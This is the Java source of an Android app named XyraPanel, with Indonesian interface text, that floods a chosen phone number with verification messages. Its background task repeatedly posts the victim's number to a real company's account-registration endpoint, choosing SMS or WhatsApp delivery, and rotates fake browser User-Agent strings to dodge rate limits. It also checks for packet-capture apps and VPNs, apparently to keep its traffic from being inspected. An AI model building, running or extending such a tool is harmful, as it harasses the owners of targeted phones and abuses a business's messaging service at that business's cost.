package com.xyra.panel;

import android.app.Activity;
import android.app.Dialog;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.view.Window;
import android.view.LayoutInflater;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.CompoundButton;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import android.app.Notification;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.content.pm.PackageManager;
import android.content.Context;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.NetworkInterface;
import java.util.Random;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;

public class MainActivity extends Activity {

    private EditText etTargetPhone, etJumlahKirim;
    private TextView tvAppTitle;
    private Button btnStartFlood;
    private Button btnQuick1, btnQuick3, btnQuick5, btnQuickRandom;
    private Button btnSms, btnWhatsapp;
    private ProgressBar progressBar;
    private TextView tvStatusTitle;
    private TextView tvStatSuccess, tvStatFailed, tvStatAvg;
    private View statusDot;
    private View btnFailureInfo;

    private AccFloodTask currentTask;
    private boolean isRunning = false;
    private static final int MAX_SEND = 5;
    private String selectedProvider = "sms";
    private static final String PREFS_NAME = "XyraPanelPrefs";
    private static final String KEY_PRIVACY_ACCEPTED = "privacy_accepted";
    private static final String KEY_HISTORY = "send_history";
    private static final String CHANNEL_ID = "xyra_channel";
    private static final String ACTION_SHOW_HISTORY = "com.xyra.panel.SHOW_HISTORY";
    private static final int NOTIFICATION_ID = 1001;
    private Button btnHistory, btnAbout;
    
    private ArrayList<FailureInfo> failureList = new ArrayList<>();
    
    private static class FailureInfo {
        String icon;
        String title;
        String description;
        String time;
        
        FailureInfo(String icon, String title, String description) {
            this.icon = icon;
            this.title = title;
            this.description = description;
            this.time = new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date());
        }
    }

    private class AccFloodTask extends AsyncTask<String, Object, String> {

        private int totalSuccesses = 0;
        private int totalFailures = 0;
        private long totalDurationMs = 0;
        private int totalKirim = 0;
        private final int DELAY_SECONDS = 3;
        private ArrayList<String> userAgentPool;
        private ArrayList<String> usedUserAgents;

        private void initUserAgentPool() {
            userAgentPool = new ArrayList<>();
            usedUserAgents = new ArrayList<>();
            
            String[] browsers = {"Chrome", "Firefox", "Safari", "Edge", "Opera"};
            String[] devices = {
                "Linux; Android 13; SM-S918B",
                "Linux; Android 14; Pixel 8 Pro",
                "Linux; Android 13; SM-A546B",
                "Linux; Android 12; Redmi Note 11",
                "Linux; Android 14; OnePlus 12",
                "Linux; Android 13; vivo V29",
                "Linux; Android 12; OPPO Reno8",
                "Linux; Android 14; Xiaomi 14",
                "Linux; Android 13; realme GT",
                "Linux; Android 11; Samsung Galaxy A52",
                "iPhone; CPU iPhone OS 17_0 like Mac OS X",
                "iPhone; CPU iPhone OS 16_6 like Mac OS X",
                "iPad; CPU OS 17_0 like Mac OS X",
                "Windows NT 10.0; Win64; x64",
                "Macintosh; Intel Mac OS X 10_15_7"
            };
            
            Random rand = new Random();
            for (String device : devices) {
                for (String browser : browsers) {
                    int majorVer = rand.nextInt(30) + 100;
                    int minorVer = rand.nextInt(10);
                    String ua = "Mozilla/5.0 (" + device + ") AppleWebKit/537.36 (KHTML, like Gecko) " 
                              + browser + "/" + majorVer + "." + minorVer + ".0.0 Safari/537.36";
                    userAgentPool.add(ua);
                }
            }
            Collections.shuffle(userAgentPool);
        }

        private String getUniqueUserAgent() {
            if (userAgentPool == null || userAgentPool.isEmpty()) {
                initUserAgentPool();
            }
            
            if (userAgentPool.isEmpty()) {
                userAgentPool.addAll(usedUserAgents);
                usedUserAgents.clear();
                Collections.shuffle(userAgentPool);
            }
            
            String ua = userAgentPool.remove(0);
            usedUserAgents.add(ua);
            return ua;
        }

        @Override
        protected void onPreExecute() {
            isRunning = true;
            statusDot.setBackgroundResource(R.drawable.dot_orange);
            tvStatusTitle.setText("Sending...");
            tvStatusTitle.setTextColor(getResources().getColor(R.color.warningColor));
            tvStatSuccess.setText("0");
            tvStatFailed.setText("0");
            tvStatAvg.setText("0");
            btnStartFlood.setText("STOP");
            btnStartFlood.setBackgroundResource(R.drawable.button_stop);
        }

        @Override
        protected String doInBackground(String... params) {
            String targetPhone = params[0];
            totalKirim = Integer.parseInt(params[1]);

            String urlStr = "https://www.acc.co.id/register/new-account";
            String phoneWith0 = targetPhone.startsWith("0") ? targetPhone : "0" + targetPhone;

            for (int i = 1; i <= totalKirim; i++) {
                if (isCancelled()) break;

                long startTime = System.currentTimeMillis();

                HttpURLConnection conn = null;
                try {
                    JSONArray jsonArray = new JSONArray();
                    JSONObject payload = new JSONObject();
                    payload.put("user_id", JSONObject.NULL);
                    payload.put("action", "register");
                    payload.put("send_to", phoneWith0);
                    payload.put("provider", selectedProvider);
                    jsonArray.put(payload);

                    String jsonData = jsonArray.toString();
                    String userAgent = getUniqueUserAgent();

                    URL url = new URL(urlStr);
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setConnectTimeout(15000);
                    conn.setReadTimeout(20000);
                    conn.setDoOutput(true);

                    conn.setRequestProperty("User-Agent", userAgent);
                    conn.setRequestProperty("Accept", "text/x-component");
                    conn.setRequestProperty("Content-Type", "text/plain");
                    conn.setRequestProperty("next-action", "7f6a1c8f7e114d52467f0195e8e23c7c6f235468b7");
                    conn.setRequestProperty("Origin", "https://www.acc.co.id");
                    conn.setRequestProperty("Referer", "https://www.acc.co.id/register/new-account");
                    conn.setRequestProperty("sec-ch-ua-platform", "\"Android\"");

                    OutputStream os = conn.getOutputStream();
                    os.write(jsonData.getBytes("UTF-8"));
                    os.flush();
                    os.close();

                    int responseCode = conn.getResponseCode();
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;

                    if (responseCode == 200) {
                        totalSuccesses++;
                    } else {
                        totalFailures++;
                        publishProgress("FAILURE", "Server Error", "Response code: " + responseCode, i, totalKirim);
                    }

                } catch (java.net.SocketTimeoutException e) {
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;
                    totalFailures++;
                    publishProgress("FAILURE", "Timeout", "Koneksi terlalu lama, jaringan lambat", i, totalKirim);
                } catch (java.net.UnknownHostException e) {
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;
                    totalFailures++;
                    publishProgress("FAILURE", "Tidak Ada Jaringan", "Periksa koneksi internet Anda", i, totalKirim);
                } catch (java.io.IOException e) {
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;
                    totalFailures++;
                    publishProgress("FAILURE", "Koneksi Gagal", e.getMessage(), i, totalKirim);
                } catch (Exception e) {
                    long duration = System.currentTimeMillis() - startTime;
                    totalDurationMs += duration;
                    totalFailures++;
                    publishProgress("FAILURE", "Error", e.getMessage(), i, totalKirim);
                } finally {
                    if (conn != null) {
                        conn.disconnect();
                    }
                }

                int progress = (int) ((float) i / totalKirim * 100);
                long avgTime = (i > 0) ? totalDurationMs / i : 0;
                publishProgress("PROGRESS", progress, totalSuccesses, totalFailures, avgTime, i, totalKirim);

                if (i < totalKirim && !isCancelled()) {
                    try {
                        Thread.sleep(DELAY_SECONDS * 1000);
                    } catch (InterruptedException e) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            }
            return isCancelled() ? "Cancelled" : "Selesai";
        }

        @Override
        protected void onProgressUpdate(Object... values) {
            String type = (String) values[0];
            if ("PROGRESS".equals(type)) {
                progressBar.setProgress((Integer) values[1]);
                tvStatSuccess.setText(String.valueOf((Integer) values[2]));
                tvStatFailed.setText(String.valueOf((Integer) values[3]));
                tvStatAvg.setText(String.valueOf((Long) values[4]));
                tvStatusTitle.setText("Sending " + values[5] + "/" + values[6]);
            } else if ("FAILURE".equals(type)) {
                String title = (String) values[1];
                String desc = (String) values[2];
                addFailureInfo("!", title, desc);
            }
        }

        @Override
        protected void onPostExecute(String result) {
            finishTask(false);
        }

        @Override
        protected void onCancelled() {
            finishTask(true);
        }

        private void finishTask(boolean wasCancelled) {
            isRunning = false;
            progressBar.setVisibility(View.GONE);
            enableQuickButtons(true);
            btnStartFlood.setText("MULAI KIRIM");
            btnStartFlood.setBackgroundResource(R.drawable.button_primary);

            String phone = etTargetPhone.getText().toString().trim();
            saveHistory(phone, totalSuccesses, totalFailures, selectedProvider);

            if (wasCancelled) {
                statusDot.setBackgroundResource(R.drawable.dot_orange);
                tvStatusTitle.setText("Stopped");
                tvStatusTitle.setTextColor(getResources().getColor(R.color.warningColor));
                showNotification("Pengiriman Dihentikan", "Berhasil: " + totalSuccesses + ", Gagal: " + totalFailures);
            } else {
                statusDot.setBackgroundResource(R.drawable.dot_green);
                tvStatusTitle.setText("Completed");
                tvStatusTitle.setTextColor(getResources().getColor(R.color.successColor));
                showNotification("Pengiriman Selesai", "Berhasil: " + totalSuccesses + ", Gagal: " + totalFailures);
            }

            currentTask = null;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        etTargetPhone = findViewById(R.id.et_target_phone);
        etJumlahKirim = findViewById(R.id.et_jumlah_kirim);
        btnStartFlood = findViewById(R.id.btn_start_flood);
        btnQuick1 = findViewById(R.id.btn_quick_1);
        btnQuick3 = findViewById(R.id.btn_quick_3);
        btnQuick5 = findViewById(R.id.btn_quick_5);
        btnQuickRandom = findViewById(R.id.btn_quick_random);
        btnSms = findViewById(R.id.btn_sms);
        btnWhatsapp = findViewById(R.id.btn_whatsapp);
        progressBar = findViewById(R.id.progress_bar);
        tvStatusTitle = findViewById(R.id.tv_status_title);
        tvStatSuccess = findViewById(R.id.tv_stat_success);
        tvStatFailed = findViewById(R.id.tv_stat_failed);
        tvStatAvg = findViewById(R.id.tv_stat_avg);
        statusDot = findViewById(R.id.status_dot);
        btnFailureInfo = findViewById(R.id.btn_failure_info);

        btnQuick1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                etJumlahKirim.setText("1");
            }
        });

        btnQuick3.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                etJumlahKirim.setText("3");
            }
        });

        btnQuick5.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                etJumlahKirim.setText("5");
            }
        });

        btnQuickRandom.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Random rand = new Random();
                int randomNum = rand.nextInt(MAX_SEND) + 1;
                etJumlahKirim.setText(String.valueOf(randomNum));
            }
        });

        btnSms.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                selectProvider("sms");
            }
        });

        btnWhatsapp.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                selectProvider("whatsapp");
            }
        });

        btnStartFlood.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (isRunning) {
                    if (currentTask != null) {
                        currentTask.cancel(true);
                    }
                } else {
                    startSending();
                }
            }
        });
        
        btnFailureInfo.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showFailureInfoDialog();
            }
        });

        btnHistory = findViewById(R.id.btn_history);
        btnAbout = findViewById(R.id.btn_about);
        tvAppTitle = findViewById(R.id.tv_app_title);
        tvAppTitle.setText("XyraPanel");
        tvAppTitle.setTextColor(getResources().getColor(R.color.colorPrimary));

        btnHistory.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showHistoryDialog();
            }
        });

        btnAbout.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showAboutDialog();
            }
        });

        createNotificationChannel();
        checkPrivacyPolicy();
        selectProvider("sms");
        handleNotificationIntent(getIntent());
    }
    
    private void addFailureInfo(String icon, String title, String description) {
        failureList.add(new FailureInfo(icon, title, description));
        updateFailureIcon();
    }
    
    private void updateFailureIcon() {
        if (failureList.size() > 0) {
            btnFailureInfo.setVisibility(View.VISIBLE);
        } else {
            btnFailureInfo.setVisibility(View.GONE);
        }
    }
    
    private void showFailureInfoDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.dialog_failure_info);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.setCancelable(true);
        
        TextView tvFailureCount = dialog.findViewById(R.id.tv_failure_count);
        LinearLayout layoutItems = dialog.findViewById(R.id.layout_failure_items);
        Button btnClear = dialog.findViewById(R.id.btn_clear_failures);
        Button btnClose = dialog.findViewById(R.id.btn_close_failures);
        
        tvFailureCount.setText(failureList.size() + " masalah terdeteksi");
        
        if (isVpnActive()) {
            addFailureItemToLayout(layoutItems, "V", "VPN Terdeteksi", "VPN aktif dapat mengganggu koneksi");
        }
        
        if (isPacketCaptureAppInstalled()) {
            addFailureItemToLayout(layoutItems, "H", "HTTP Capture Terdeteksi", "Aplikasi capture HTTP/SSL terinstal");
        }
        
        if (!isNetworkAvailable()) {
            addFailureItemToLayout(layoutItems, "N", "Tidak Ada Jaringan", "Perangkat tidak terhubung ke internet");
        }
        
        for (FailureInfo info : failureList) {
            addFailureItemToLayout(layoutItems, info.icon, info.title, info.description, info.time);
        }
        
        btnClear.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                failureList.clear();
                updateFailureIcon();
                dialog.dismiss();
                Toast.makeText(MainActivity.this, "Info kegagalan dihapus", Toast.LENGTH_SHORT).show();
            }
        });
        
        btnClose.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }
        });
        
        dialog.show();
    }
    
    private void addFailureItemToLayout(LinearLayout parent, String icon, String title, String desc) {
        addFailureItemToLayout(parent, icon, title, desc, "");
    }
    
    private void addFailureItemToLayout(LinearLayout parent, String icon, String title, String desc, String time) {
        View itemView = LayoutInflater.from(this).inflate(R.layout.item_failure_reason, parent, false);
        
        TextView tvIcon = itemView.findViewById(R.id.tv_failure_icon);
        TextView tvTitle = itemView.findViewById(R.id.tv_failure_title);
        TextView tvDesc = itemView.findViewById(R.id.tv_failure_desc);
        TextView tvTime = itemView.findViewById(R.id.tv_failure_time);
        
        tvIcon.setText(icon);
        tvTitle.setText(title);
        tvDesc.setText(desc);
        tvTime.setText(time);
        
        parent.addView(itemView);
    }
    
    private boolean isVpnActive() {
        try {
            Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                NetworkInterface iface = interfaces.nextElement();
                String name = iface.getName().toLowerCase();
                if ((name.contains("tun") || name.contains("ppp") || name.contains("pptp")) && iface.isUp()) {
                    return true;
                }
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                Network activeNetwork = cm.getActiveNetwork();
                if (activeNetwork != null) {
                    NetworkCapabilities caps = cm.getNetworkCapabilities(activeNetwork);
                    if (caps != null && caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) {
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
    
    private boolean isPacketCaptureAppInstalled() {
        String[] captureApps = {
            "app.greyshirts.sslcapture",
            "com.guyshefer.sslcaptureandroidexpert",
            "com.egorovandreyrm.pcapremote",
            "com.minhui.networkcapture",
            "jp.co.taosoftware.android.packetcapture",
            "com.emanuelef.remote_capture",
            "eu.faircode.netguard",
            "tech.httptoolkit.android.v1",
            "com.reqable.android",
            "com.charlesproxy.charles",
            "org.proxydroid",
            "org.sandroproxy.drony",
            "com.mightydeveloper.httpcatcher"
        };
        
        PackageManager pm = getPackageManager();
        for (String packageName : captureApps) {
            try {
                pm.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
                return true;
            } catch (PackageManager.NameNotFoundException e) {
            }
        }
        return false;
    }
    
    private boolean isNetworkAvailable() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm == null) return false;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Network network = cm.getActiveNetwork();
            if (network == null) return false;
            NetworkCapabilities caps = cm.getNetworkCapabilities(network);
            return caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
        } else {
            NetworkInfo networkInfo = cm.getActiveNetworkInfo();
            return networkInfo != null && networkInfo.isConnected();
        }
    }
    
    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        handleNotificationIntent(intent);
    }
    
    private void handleNotificationIntent(Intent intent) {
        if (intent != null && ACTION_SHOW_HISTORY.equals(intent.getAction())) {
            showHistoryDialog();
        }
    }

    private void checkPrivacyPolicy() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        boolean accepted = prefs.getBoolean(KEY_PRIVACY_ACCEPTED, false);

        if (!accepted) {
            showPrivacyDialog();
        }
    }

    private void showPrivacyDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.dialog_privacy);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.setCancelable(false);

        final CheckBox cbAccept = dialog.findViewById(R.id.cb_accept_privacy);
        final Button btnAccept = dialog.findViewById(R.id.btn_accept_privacy);

        cbAccept.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {
            @Override
            public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {
                btnAccept.setEnabled(isChecked);
                btnAccept.setAlpha(isChecked ? 1.0f : 0.5f);
            }
        });

        btnAccept.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                SharedPreferences.Editor editor = prefs.edit();
                editor.putBoolean(KEY_PRIVACY_ACCEPTED, true);
                editor.apply();
                dialog.dismiss();
                Toast.makeText(MainActivity.this, "Selamat datang di Xyra Panel!", Toast.LENGTH_SHORT).show();
            }
        });

        dialog.show();
    }

    private void startSending() {
        try {
            String targetPhone = etTargetPhone.getText().toString().trim();
            String jumlahStr = etJumlahKirim.getText().toString().trim();

            if (targetPhone.isEmpty() || jumlahStr.isEmpty()) {
                Toast.makeText(this, "Isi semua kolom!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            if (!isNetworkAvailable()) {
                addFailureInfo("N", "Tidak Ada Jaringan", "Tidak dapat mengirim tanpa koneksi internet");
                Toast.makeText(this, "Tidak ada koneksi internet!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            if (isVpnActive()) {
                addFailureInfo("V", "VPN Aktif", "VPN terdeteksi aktif saat pengiriman");
            }
            
            if (isPacketCaptureAppInstalled()) {
                addFailureInfo("H", "HTTP Capture", "Aplikasi capture terdeteksi terinstal");
            }

            int jumlahKirim = Integer.parseInt(jumlahStr);
            if (jumlahKirim < 1 || jumlahKirim > MAX_SEND) {
                showMaxWarningDialog();
                return;
            }

            enableQuickButtons(false);
            progressBar.setVisibility(View.VISIBLE);
            progressBar.setProgress(0);

            currentTask = new AccFloodTask();
            currentTask.execute(targetPhone, String.valueOf(jumlahKirim));

        } catch (NumberFormatException e) {
            Toast.makeText(this, "Jumlah harus angka!", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Error: " + e.getMessage(), Toast.LENGTH_LONG).show();
            enableQuickButtons(true);
            progressBar.setVisibility(View.GONE);
        }
    }

    private void showMaxWarningDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.dialog_warning);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.setCancelable(true);

        Button btnOk = dialog.findViewById(R.id.btn_dialog_ok);
        btnOk.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
                etJumlahKirim.setText("");
                etJumlahKirim.requestFocus();
            }
        });

        dialog.show();
    }

    private void enableQuickButtons(boolean enabled) {
        btnQuick1.setEnabled(enabled);
        btnQuick3.setEnabled(enabled);
        btnQuick5.setEnabled(enabled);
        btnQuickRandom.setEnabled(enabled);
        btnSms.setEnabled(enabled);
        btnWhatsapp.setEnabled(enabled);
    }

    private void selectProvider(String provider) {
        selectedProvider = provider;
        if (provider.equals("sms")) {
            btnSms.setBackgroundResource(R.drawable.button_quick_accent);
            btnSms.setTextColor(getResources().getColor(android.R.color.white));
            btnWhatsapp.setBackgroundResource(R.drawable.button_quick);
            btnWhatsapp.setTextColor(getResources().getColor(R.color.colorPrimary));
        } else {
            btnWhatsapp.setBackgroundResource(R.drawable.button_quick_accent);
            btnWhatsapp.setTextColor(getResources().getColor(android.R.color.white));
            btnSms.setBackgroundResource(R.drawable.button_quick);
            btnSms.setTextColor(getResources().getColor(R.color.colorPrimary));
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Xyra Notifications",
                NotificationManager.IMPORTANCE_DEFAULT
            );
            channel.setDescription("Notifikasi pengiriman");
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private void showNotification(String title, String message) {
        try {
            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            
            Intent intent = new Intent(this, MainActivity.class);
            intent.setAction(ACTION_SHOW_HISTORY);
            intent.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
            
            PendingIntent pendingIntent;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
            } else {
                pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
            }
            
            Notification.Builder builder;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                builder = new Notification.Builder(this, CHANNEL_ID);
            } else {
                builder = new Notification.Builder(this);
            }
            
            builder.setSmallIcon(android.R.drawable.ic_dialog_info)
                   .setContentTitle(title)
                   .setContentText(message)
                   .setContentIntent(pendingIntent)
                   .setAutoCancel(true);
            
            if (manager != null) {
                manager.notify(NOTIFICATION_ID, builder.build());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void saveHistory(String phone, int success, int failed, String provider) {
        try {
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            String history = prefs.getString(KEY_HISTORY, "");
            
            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM HH:mm", Locale.getDefault());
            String timestamp = sdf.format(new Date());
            
            String newEntry = timestamp + "|" + phone + "|" + success + "|" + failed + "|" + provider.toUpperCase();
            
            if (!history.isEmpty()) {
                history = newEntry + "\n" + history;
            } else {
                history = newEntry;
            }
            
            String[] lines = history.split("\n");
            if (lines.length > 20) {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 20; i++) {
                    sb.append(lines[i]);
                    if (i < 19) sb.append("\n");
                }
                history = sb.toString();
            }
            
            SharedPreferences.Editor editor = prefs.edit();
            editor.putString(KEY_HISTORY, history);
            editor.apply();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void showHistoryDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.dialog_history);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.setCancelable(true);

        final TextView tvHistory = dialog.findViewById(R.id.tv_history_content);
        Button btnClear = dialog.findViewById(R.id.btn_clear_history);
        Button btnClose = dialog.findViewById(R.id.btn_close_history);

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String history = prefs.getString(KEY_HISTORY, "");

        if (history.isEmpty()) {
            tvHistory.setText("Belum ada riwayat pengiriman");
        } else {
            StringBuilder formatted = new StringBuilder();
            String[] lines = history.split("\n");
            for (String line : lines) {
                String[] parts = line.split("\\|");
                if (parts.length >= 5) {
                    formatted.append(parts[0]).append("\n");
                    formatted.append("  ").append(parts[1]).append(" (").append(parts[4]).append(")\n");
                    formatted.append("  Berhasil: ").append(parts[2]).append(" | Gagal: ").append(parts[3]).append("\n\n");
                }
            }
            tvHistory.setText(formatted.toString().trim());
        }

        btnClear.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
                SharedPreferences.Editor editor = prefs.edit();
                editor.remove(KEY_HISTORY);
                editor.apply();
                tvHistory.setText("Riwayat telah dihapus");
                Toast.makeText(MainActivity.this, "Riwayat dihapus", Toast.LENGTH_SHORT).show();
            }
        });

        btnClose.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }
        });

        dialog.show();
    }

    private void showAboutDialog() {
        final Dialog dialog = new Dialog(this);
        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
        dialog.setContentView(R.layout.dialog_about);
        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
        dialog.setCancelable(true);

        Button btnClose = dialog.findViewById(R.id.btn_close_about);
        btnClose.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }
        });

        dialog.show();
    }
}
